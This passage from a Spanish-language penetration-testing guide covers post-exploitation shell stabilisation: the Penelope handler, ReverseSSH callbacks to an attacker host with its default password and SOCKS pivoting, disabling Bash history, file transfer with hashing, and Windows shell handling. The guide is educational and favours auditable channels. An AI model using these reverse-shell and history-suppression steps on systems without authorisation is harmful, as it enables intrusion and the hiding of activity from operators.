Penelope es un shell handler escrito en Python puro, sin dependencias externas, pensado para automatizar el ciclo completo de post-explotación: detecta el intérprete disponible en el objetivo (Python, Perl, Ruby o utilidades básicas), realiza el *upgrade* automático a PTY, ajusta el tamaño de terminal en tiempo real y mantiene logging de la sesión. En sistemas Unix con Python 2.3 o superior consigue una PTY completa; sin Python recurre a una segunda conexión TCP; en Windows el *upgrade* se limita a `readline`, sin redimensionado en tiempo real ni port forwarding local.

<pre class="cmd-block"><code><span class="comment"># [LOCAL] Descargar y ejecutar sin instalación</span>
<span class="tool">wget</span> https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py &amp;&amp; <span class="tool">python3</span> penelope.py

<span class="comment"># [LOCAL] Escuchar en el puerto por defecto (4444)</span>
<span class="tool">penelope</span>

<span class="comment"># [LOCAL] Escuchar en varios puertos a la vez</span>
<span class="tool">penelope</span> 1111 2222 3333

<span class="comment"># [LOCAL] Conectar contra una bind shell en el objetivo</span>
<span class="tool">penelope</span> -c &lt;IP_OBJETIVO&gt; 3333</code></pre>

Por defecto, tras el *upgrade* automático a PTY, la combinación `F12` desacopla la sesión y devuelve al menú principal sin matar el proceso remoto; si el *upgrade* no fue posible y queda una shell básica, `Ctrl+C` cumple esa misma función. Esta semántica de teclas es propia de Penelope y no corresponde a las señales estándar descritas en la sección 7.1: no debe confundirse `F12`/`Ctrl+C` en el menú de Penelope con `SIGTSTP`/`SIGINT` sobre el proceso remoto.

| Aspecto | Comportamiento en Penelope |
|---|---|
| Upgrade automático | PTY en Unix con Python; `readline` en Windows |
| Redimensionado en tiempo real | Sí en Unix; no en Windows |
| Logging de sesión | Activado por defecto; desactivable con `-L` |
| Multi-sesión y multi-listener | Sí |
| Transferencia de ficheros | Descarga y subida integradas, incluyendo carpetas y HTTP |
| Mantenimiento de shells | Opción `-m` para conservar N shells activas por objetivo |

#### ReverseSSH

ReverseSSH es un servidor SSH compilado como binario estático (menos de 1.5 MB) que se despliega en el objetivo y ofrece acceso interactivo completo, SFTP y port forwarding usando el cliente `ssh` estándar del operador, sin necesidad de construir una PTY manualmente.

<pre class="cmd-block"><code><span class="comment"># [REMOTO] Ejecutar en modo reverse contra el atacante</span>
<span class="tool">./reverse-ssh</span> -p &lt;LPORT&gt; &lt;LHOST&gt;

<span class="comment"># [LOCAL] Preparar la escucha</span>
<span class="tool">./reverse-ssh</span> -v -l -p &lt;LPORT&gt;

<span class="comment"># [LOCAL] Conectar con el cliente SSH habitual (password por defecto: letmeinbrudipls)</span>
<span class="tool">ssh</span> -p &lt;PUERTO&gt; 127.0.0.1

<span class="comment"># [LOCAL] Transferencia de ficheros vía SFTP</span>
<span class="tool">sftp</span> -P &lt;PUERTO&gt; &lt;RHOST&gt;

<span class="comment"># [LOCAL] Proxy SOCKS mediante port forwarding dinámico</span>
<span class="tool">ssh</span> -p &lt;PUERTO&gt; -D 9050 &lt;RHOST&gt;</code></pre>

En Windows, una sesión de PowerShell totalmente interactiva mediante ReverseSSH depende de ConPTY y requiere como mínimo Windows 10 Build 17763. En versiones anteriores solo se obtiene una shell reversa sin interpretación de códigos de terminal virtual (fallan flechas y `Ctrl+C`), salvo que se acompañe el binario `ssh-shellhost.exe` de OpenSSH para Windows con la opción `-s ssh-shellhost.exe`, que actúa como intermediario y traduce las secuencias de terminal virtual.

La elección entre ambas herramientas depende del objetivo: Penelope centraliza la gestión desde el lado del atacante y es preferible cuando se manejan múltiples sesiones simultáneas; ReverseSSH traslada la robustez al propio objetivo desplegando un servidor SSH real, lo que resulta más adecuado cuando se necesita SFTP y port forwarding estables con las herramientas SSH nativas del operador.

---

## 6. Configuración de entorno Linux

Una shell estabilizada puede seguir siendo incómoda o inconsistente. El siguiente bloque reúne variables y ajustes útiles.

<pre class="cmd-block"><code><span class="comment"># Shell preferida</span>
<span class="tool">export</span> SHELL=/bin/bash

<span class="comment"># Tipo de terminal</span>
<span class="tool">export</span> TERM=xterm-256color

<span class="comment"># Locale predecible para herramientas y parsing</span>
<span class="tool">export</span> LANG=C
<span class="tool">export</span> LC_ALL=C

<span class="comment"># PATH explícito si el entorno es mínimo</span>
<span class="tool">export</span> PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

<span class="comment"># Desactivar o redirigir historial de Bash durante la sesión</span>
<span class="tool">export</span> HISTFILE=/dev/null
<span class="tool">unset</span> HISTFILESIZE
<span class="tool">unset</span> HISTSIZE

<span class="comment"># Prompt mínimo para distinguir contexto sin contaminar demasiado la salida</span>
<span class="tool">export</span> PS1='[\u@\h \W]\$ '</code></pre>

### 6.1. Consideraciones sobre historial

Modificar `HISTFILE` evita que Bash escriba el historial futuro de esa sesión en el fichero habitual, pero no borra entradas existentes ni garantiza que no haya otros mecanismos de registro:

- Auditd.
- Journald.
- Historial de Zsh o Fish.
- Registro de comandos por EDR.
- Telemetría de terminal.
- Logs de sesión SSH.
- Bastion hosts.
- Grabación de terminal.
- Sysmon for Linux.
- Herramientas PAM o mecanismos de auditoría corporativa.

Por tanto, `HISTFILE=/dev/null` es una medida de higiene de sesión, no una garantía de ausencia de trazabilidad.

### 6.2. Shells de login e interactivas

Bash se comporta de forma diferente según sea:

- Shell interactiva.
- Shell no interactiva.
- Shell de login.
- Shell invocada como `sh`.

Puede comprobarse parte del estado actual con:

<pre class="cmd-block"><code><span class="comment"># Flags de shell; la presencia de "i" indica modo interactivo</span>
<span class="tool">echo</span> "$-"

<span class="comment"># Proceso y argumentos de la shell actual</span>
<span class="tool">ps</span> -p $$ -o pid,ppid,tty,stat,args=

<span class="comment"># Archivos habituales de configuración presentes</span>
<span class="tool">ls</span> -la ~/.bashrc ~/.bash_profile ~/.profile 2&gt;/dev/null</code></pre>

Una shell de login puede cargar configuraciones adicionales desde `/etc/profile`, `~/.bash_profile`, `~/.bash_login` o `~/.profile`; una interactiva normal suele cargar `~/.bashrc`. El resultado práctico puede afectar a `PATH`, alias, proxy, variables de entorno y herramientas disponibles.

---

## 7. Señales, control de trabajos y procesos

### 7.1. Señales relevantes

| Tecla / señal | Nombre | Comportamiento habitual |
|---|---|---|
| `Ctrl+C` | `SIGINT` | Interrumpe el proceso en primer plano |
| `Ctrl+Z` | `SIGTSTP` | Suspende el proceso en primer plano |
| `Ctrl+\` | `SIGQUIT` | Finaliza el proceso y puede generar core dump |
| `Ctrl+D` | EOF | Indica fin de entrada; puede cerrar una shell |
| `Ctrl+L` | Limpieza de pantalla | Redibuja o limpia la terminal |
| `Ctrl+R` | Búsqueda de historial | Requiere una shell interactiva funcional |

En una shell no estabilizada, `Ctrl+C` puede ser interpretado por el proceso local que mantiene el canal, lo que termina la conexión completa. Tras disponer de PTY y control de terminal, debe llegar como `SIGINT` al proceso remoto en primer plano.

### 7.2. Control de trabajos Bash

<pre class="cmd-block"><code><span class="comment"># Listar trabajos de la shell actual</span>
<span class="tool">jobs</span> -l

<span class="comment"># Reanudar el último trabajo suspendido en segundo plano</span>
<span class="tool">bg</span>

<span class="comment"># Devolver el último trabajo suspendido al primer plano</span>
<span class="tool">fg</span>

<span class="comment"># Reanudar un trabajo concreto</span>
<span class="tool">fg</span> %1
<span class="tool">bg</span> %1

<span class="comment"># Ejecutar un proceso en segundo plano</span>
comando &amp;

<span class="comment"># Separar un proceso de la terminal, cuando proceda</span>
<span class="tool">nohup</span> comando &gt;/tmp/comando.log 2&gt;&amp;1 &amp;</code></pre>

El control de trabajos depende de una shell interactiva y de un terminal. Bash describe `bg` como el mecanismo para reanudar trabajos suspendidos en segundo plano y `fg` como el mecanismo para devolverlos al primer plano. [1][4]

### 7.3. Identificación de procesos y árboles

<pre class="cmd-block"><code><span class="comment"># Árbol de procesos</span>
<span class="tool">ps</span> -ef --forest 2&gt;/dev/null
<span class="tool">pstree</span> -ap 2&gt;/dev/null

<span class="comment"># Proceso actual y ancestros</span>
<span class="tool">ps</span> -o pid,ppid,sid,pgid,tty,stat,cmd -p $$

<span class="comment"># Sesiones y terminales</span>
<span class="tool">w</span>
<span class="tool">who</span>
<span class="tool">loginctl</span> list-sessions 2&gt;/dev/null</code></pre>

Esto permite distinguir si la shell está colgada de un proceso de servicio, un demonio web, un agente, una sesión SSH, una tarea programada o un proceso de usuario.

---

## 8. Transferencia de ficheros y verificación

La transferencia de ficheros no debe tratarse como un paso improvisado. Debe responder a cuatro requisitos:

1. Integridad.
2. Trazabilidad.
3. Mínimo impacto.
4. Limpieza controlada de artefactos temporales cuando corresponda.

### 8.1. Identificar herramientas disponibles

<pre class="cmd-block"><code><span class="tool">command</span> -v curl
<span class="tool">command</span> -v wget
<span class="tool">command</span> -v nc
<span class="tool">command</span> -v ncat
<span class="tool">command</span> -v python3
<span class="tool">command</span> -v base64
<span class="tool">command</span> -v openssl
<span class="tool">command</span> -v scp
<span class="tool">command</span> -v sftp</code></pre>

### 8.2. Verificación de integridad

Siempre que se transfiera un artefacto legítimo de trabajo, calcular y registrar un hash antes y después.

<pre class="cmd-block"><code><span class="comment"># SHA-256 del fichero</span>
<span class="tool">sha256sum</span> fichero

<span class="comment"># Alternativa OpenSSL</span>
<span class="tool">openssl</span> dgst -sha256 fichero

<span class="comment"># Hashes alternativos cuando SHA-256 no está disponible</span>
<span class="tool">md5sum</span> fichero
<span class="tool">sha1sum</span> fichero</code></pre>

SHA-256 debe ser el valor preferido para verificar integridad. MD5 y SHA-1 pueden servir para correlación con información heredada, pero no deben considerarse mecanismos criptográficos modernos de integridad frente a manipulación.

### 8.3. Codificación Base64 para contenido pequeño

Para texto, scripts cortos o ficheros pequeños, Base64 puede evitar problemas de caracteres especiales.

**En el sistema origen:**

<pre class="cmd-block"><code><span class="tool">base64</span> -w 0 fichero &gt; fichero.b64</code></pre>

**En el sistema destino:**

<pre class="cmd-block"><code><span class="tool">base64</span> -d fichero.b64 &gt; fichero
<span class="tool">sha256sum</span> fichero</code></pre>

En macOS y algunas variantes BSD, la sintaxis de Base64 puede diferir. Una alternativa más portable es:

<pre class="cmd-block"><code><span class="tool">base64</span> fichero | tr -d '\n'</code></pre>

La codificación Base64 no cifra el contenido ni evita inspección; solo representa los bytes como texto.

### 8.4. Directorios temporales

Antes de crear artefactos temporales, revisar opciones disponibles:

<pre class="cmd-block"><code><span class="tool">ls</span> -ld /tmp /var/tmp /dev/shm 2&gt;/dev/null
<span class="tool">mount</span> | grep -E '/tmp|/var/tmp|/dev/shm'
<span class="tool">df</span> -h /tmp /var/tmp /dev/shm 2&gt;/dev/null</code></pre>

| Ruta | Característica típica | Consideración |
|---|---|---|
| `/tmp` | Temporal y global | Puede limpiarse al reiniciar; puede tener `noexec` |
| `/var/tmp` | Temporal más persistente | Puede sobrevivir a reinicios |
| `/dev/shm` | Memoria compartida | Puede ser volátil; revisar permisos y opciones de montaje |
| `$HOME` | Espacio del usuario | Puede tener mejor control de permisos, pero mayor trazabilidad |

No se debe asumir que un directorio temporal es ejecutable. Las opciones `noexec`, `nosuid` y `nodev` pueden afectar a la ejecución o al comportamiento de un fichero.

---

## 9. Gestión de shells Windows

Windows no usa TTY/PTTY exactamente igual que Unix. Las sesiones modernas pueden apoyarse en **ConPTY**, el pseudoterminal de Windows, mientras que sesiones más simples pueden limitarse a flujos de entrada/salida sin emulación de consola completa.

### 9.1. Identificación inicial

**CMD:**

<pre class="cmd-block"><code><span class="tool">whoami</span>
<span class="tool">hostname</span>
<span class="tool">ver</span>
<span class="tool">systeminfo</span>
<span class="tool">echo</span> %COMSPEC%
<span class="tool">echo</span> %USERNAME%
<span class="tool">echo</span> %USERDOMAIN%</code></pre>

**PowerShell:**

<pre class="cmd-block"><code><span class="tool">whoami</span>
<span class="tool">$env:COMPUTERNAME</span>
<span class="tool">$PSVersionTable</span>
<span class="tool">[Environment]::Is64BitOperatingSystem</span>
<span class="tool">[Environment]::Is64BitProcess</span>
<span class="tool">Get-CimInstance</span> Win32_OperatingSystem
<span class="tool">Get-Location</span></code></pre>

### 9.2. Determinar contexto y token

<pre class="cmd-block"><code><span class="comment"># Privilegios y grupos del token actual</span>
<span class="tool">whoami</span> /all

<span class="comment"># Privilegios concretos</span>
<span class="tool">whoami</span> /priv

<span class="comment"># Grupos del usuario y SID</span>
<span class="tool">whoami</span> /groups

<span class="comment"># Procesos y proceso actual en PowerShell</span>
<span class="tool">Get-Process</span> -Id $PID
<span class="tool">Get-CimInstance</span> Win32_Process -Filter "ProcessId = $PID"</code></pre>

### 9.3. Pasar de CMD a PowerShell

Si PowerShell está disponible, suele proporcionar mejores capacidades de automatización, serialización de objetos y administración remota.

<pre class="cmd-block"><code><span class="comment"># Desde CMD, abrir PowerShell sin cargar perfiles</span>
<span class="tool">powershell.exe</span> -NoLogo -NoProfile

<span class="comment"># Usar PowerShell de 64 bits desde un proceso de 32 bits en Windows de 64 bits</span>
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe -NoLogo -NoProfile</code></pre>

El uso de `-NoProfile` evita que perfiles de PowerShell alteren el comportamiento de la sesión. No impide auditoría, logging o mecanismos de seguridad del sistema.

### 9.4. Sesiones administrables: WinRM y SSH

Cuando el alcance y las credenciales lo permitan, es preferible migrar desde una shell frágil a un canal autenticado, auditable y con mejor soporte de terminal:

| Transporte | Ventajas | Consideraciones |
|---|---|---|
| SSH | Interactividad, túneles, SCP/SFTP, registro claro | Requiere servidor y credenciales |
| WinRM | Nativo de administración Windows, objetos PowerShell | Puede devolver salida no idéntica a una consola |
| RDP | Interfaz gráfica completa | Mayor consumo y visibilidad |
| Consola local | Máxima fidelidad | Requiere acceso directo o mecanismo de administración |
| PowerShell Remoting | Administración y automatización | Depende de configuración de remoting |

Una sesión más administrable reduce errores de interpretación y mejora la repetibilidad de tareas. Si existe una ruta autenticada legítima, debe preferirse sobre la dependencia prolongada de un canal frágil.

### 9.5. Transferencia de ficheros en PowerShell

Para ficheros legítimos de trabajo, PowerShell permite calcular hashes y manipular contenido de forma nativa:

<pre class="cmd-block"><code><span class="comment"># Hash SHA-256</span>
<span class="tool">Get-FileHash</span> -Algorithm SHA256 .\fichero

<span class="comment"># Codificar un fichero a Base64</span>
<span class="tool">[Convert]::ToBase64String</span>([IO.File]::ReadAllBytes(".\fichero"))

<span class="comment"># Decodificar Base64 a fichero</span>
<span class="tool">[IO.File]::WriteAllBytes</span>(".\fichero",[Convert]::FromBase64String("&lt;BASE64&gt;"))

<span class="comment"># Verificar integridad</span>
<span class="tool">Get-FileHash</span> -Algorithm SHA256 .\fichero</code></pre>

---

## 10. Matriz de decisión

| Situación observada | Diagnóstico probable | Acción prioritaria |
|---|---|---|
| `tty` devuelve `not a tty` | Shell sin terminal | Intentar PTY con Python o `script` |
| `python3` existe | Entorno con soporte PTY | `pty.spawn("/bin/bash")` |
| No hay Python, existe `script` | Alternativa local disponible | `script /dev/null -qc /bin/bash` |
| Socat está en ambos extremos | Puede crearse canal robusto | Usar PTY con `setsid`, `sigint` y `sane` |
| Las flechas imprimen `^[[A` | Terminal local/remoto mal sincronizado | Revisar `TERM`, `stty`, modo raw y PTY |
| `sudo` indica que necesita TTY | Falta terminal funcional | Crear PTY y revisar política de `sudoers` |
| `Ctrl+C` mata toda la conexión | El canal no propaga señales correctamente | Estabilizar con PTY o transporte más robusto |
| `vim`/`nano` dibujan mal | Tamaño de terminal erróneo | Ejecutar `stty size` local y ajustar remoto |
| La terminal local no muestra lo escrito | `stty raw -echo` sigue activo | Ejecutar `stty sane` o `reset` |
| Shell Windows limitada | CMD o canal no interactivo | Cambiar a PowerShell o transporte administrable |
| Hay credenciales válidas para SSH/WinRM | Canal frágil innecesario | Migrar a una sesión autenticada y auditable |
| El entorno tiene PATH reducido | Shell no-login o ejecución desde servicio | Definir `PATH` explícitamente y comprobar binarios |

---

## 11. Flujo operativo recomendado

### Fase 1: preservar contexto

1. No ejecutar comandos destructivos ni cambios persistentes.
2. Registrar fecha, hora, hostname, usuario, UID/GID, proceso y terminal.
3. Capturar sistema operativo, arquitectura, kernel y directorio de trabajo.
4. Determinar si existe TTY mediante `tty`, `stty -a` y `ps`.

### Fase 2: clasificar la shell

1. Determinar si la sesión es de ejecución ciega, shell básica, sesión con I/O o PTY.
2. Probar comportamiento de entrada, salida y errores.
3. Validar si `Ctrl+C`, tabulador, flechas y `sudo -l` se comportan correctamente.
4. Identificar herramientas locales disponibles: Python, `script`, `socat`, SSH y PowerShell.

### Fase 3: estabilizar

1. Priorizar `python3` con `pty.spawn()`.
2. Si no existe Python, intentar `script`.
3. Si existe `socat` en ambos extremos y se necesita máxima fiabilidad, usar PTY dedicada.
4. Ajustar terminal local con `stty raw -echo` y recuperar la shell en primer plano.
5. Definir `TERM`, `SHELL`, `PATH`, locale y dimensiones.

### Fase 4: validar

1. Confirmar que `tty` devuelve `/dev/pts/N`.
2. Ejecutar `stty -a`.
3. Verificar que `Ctrl+C` interrumpe procesos sin cortar toda la sesión.
4. Probar un programa interactivo de bajo impacto.
5. Confirmar tamaño de filas y columnas.
6. Registrar el método de estabilización empleado.

### Fase 5: mejorar transporte

1. Evaluar si la sesión inicial es suficientemente estable.
2. Si no lo es, preferir un transporte autenticado disponible, como SSH o WinRM.
3. Priorizar canales que ofrezcan autenticación, integridad, cifrado y auditoría.
4. Mantener la sesión inicial solo el tiempo necesario para la transición.

### Fase 6: documentar

1. Guardar comandos ejecutados y resultados relevantes.
2. Registrar hashes de ficheros transferidos.
3. Diferenciar hechos observados de hipótesis.
4. Anotar limitaciones: ausencia de TTY, comandos bloqueados, falta de privilegios o transporte inestable.
5. Incluir timestamps y contexto de usuario/sistema.

---

## 12. Errores frecuentes

### Confundir una shell con una PTY

Que un comando devuelva salida no significa que la sesión sea apta para herramientas interactivas. Antes de usar `sudo`, `su`, `ssh`, editores o herramientas de monitorización, hay que comprobar `tty` y `stty -a`.

### Ejecutar `stty raw -echo` sin plan de recuperación

Si se pierde el control visual de la terminal, normalmente puede recuperarse con `stty sane`, aunque haya que escribirlo “a ciegas”. Es recomendable mantener una segunda consola local disponible.

### Configurar `TERM` sin crear una PTY

`export TERM=xterm` por sí solo no crea una terminal. Solo informa a los programas del tipo de terminal que se supone que existe. Si no hay TTY, muchas aplicaciones seguirán fallando.

### Ignorar el tamaño de terminal

Una PTY puede existir y, aun así, producir una experiencia deficiente si sus dimensiones son incorrectas. Ajustar filas y columnas evita errores de renderizado y bloqueos aparentes en TUI.

### Asumir que desactivar historial elimina evidencias

Cambiar `HISTFILE` no borra logs ni evita auditoría. La trazabilidad puede existir en múltiples capas del sistema y de la infraestructura.

### Transferir ficheros sin hash

Sin una comprobación de integridad, no hay evidencia de que el artefacto recibido sea exactamente el que se pretendía transferir. El hash debe formar parte del registro operativo.

### Quedarse demasiado tiempo en un canal frágil

Si existe una alternativa autenticada, con mejor soporte de terminal y más fiabilidad, conviene realizar la transición. Una shell precaria es un medio inicial, no necesariamente el canal operativo óptimo.

---

## Análisis y criterio propio

**La estabilización no es una fase cosmética.** Una shell sin PTY puede cambiar la interpretación de un resultado: un fallo de `sudo`, `su` o `ssh` puede deberse a ausencia de terminal y no a una restricción real de permisos o configuración. Por eso, cualquier conclusión obtenida desde una shell limitada debe marcarse como provisional hasta validar la calidad de la sesión.

**El orden correcto reduce errores.** Primero se caracteriza el canal; después se crea PTY; luego se ajusta el terminal local; finalmente se validan señales, dimensiones y herramientas interactivas. Saltarse pasos suele producir sesiones que “parecen funcionar” hasta que una herramienta crítica falla.

**La mejor shell no siempre es la más sofisticada.** Para una tarea puntual, una PTY creada con Python puede ser suficiente. Para tareas prolongadas, una sesión SSH o WinRM autenticada aporta mejores propiedades de estabilidad, autenticación, cifrado, transferencia de ficheros y auditoría.

**La documentación de la sesión tiene valor técnico.** Registrar el proceso padre, TTY, usuario, contexto, método de estabilización y hashes permite reproducir la cadena de acciones, explicar resultados ambiguos y separar hechos observados de inferencias.

---

## Limitaciones

Los nombres de binarios, rutas, capacidades y comportamiento de terminal pueden variar entre distribuciones Linux, BusyBox, contenedores mínimos, appliances de red, macOS, BSD y versiones de Windows.

Algunas sesiones se ejecutan en contextos sin terminal por diseño: procesos web, tareas programadas, servicios, contenedores no interactivos o agentes de automatización. En esos casos, forzar una interacción de consola puede no ser necesario ni apropiado para la tarea; es preferible usar comandos no interactivos, salida estructurada y procedimientos de mínimo impacto.

La sintaxis exacta de `script`, `socat`, Bash, PowerShell y herramientas relacionadas debe contrastarse con la documentación de la versión presente en el sistema.

---

## Conclusiones

El tratamiento de shells convierte un acceso técnico inicial en una sesión operativa fiable. La metodología debe empezar clasificando la calidad del canal, preservar el contexto original, crear una PTY cuando sea necesaria, sincronizar el terminal local y remoto, validar señales y programas interactivos, y documentar cada transición.

En Linux, el patrón Python/PTTY + `stty raw -echo` + `fg` + ajuste de `TERM` y dimensiones cubre la mayoría de situaciones habituales. Cuando se necesita una interacción más robusta, `socat` puede construir un canal con PTY, sesión independiente y propagación de señales. En Windows, el criterio equivalente es migrar de una consola limitada a PowerShell, SSH o WinRM cuando estén disponibles.

La diferencia entre una shell obtenida y una shell bien tratada es la diferencia entre ejecutar comandos aislados y disponer de una sesión consistente, reproducible y técnicamente defendible.

## Referencias

- [GNU Bash Reference Manual — Job Control Basics](https://www.gnu.org/software/bash/manual/html_node/Job-Control-Basics.html)
- [GNU Bash Reference Manual — Job Control Builtins](https://www.gnu.org/software/bash/manual/html_node/Job-Control-Builtins.html)
- [HackTricks — Full TTYs](https://hacktricks.wiki/en/generic-hacking/reverse-shells/full-ttys.html)
- [HackTricks — Linux Reverse Shells](https://hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)
- [GTFOBins — socat](https://gtfobins.github.io/gtfobins/socat/)
- [Linux man-pages — pty(7)](https://man7.org/linux/man-pages/man7/pty.7.html)
- [util-linux — script(1)](https://man7.org/linux/man-pages/man1/script.1.html)
- [Microsoft Learn — Pseudo Console (ConPTY)](https://learn.microsoft.com/windows/console/creating-a-pseudoconsole-session)
- [Microsoft Learn — PowerShell Remoting](https://learn.microsoft.com/powershell/scripting/learn/remoting/)
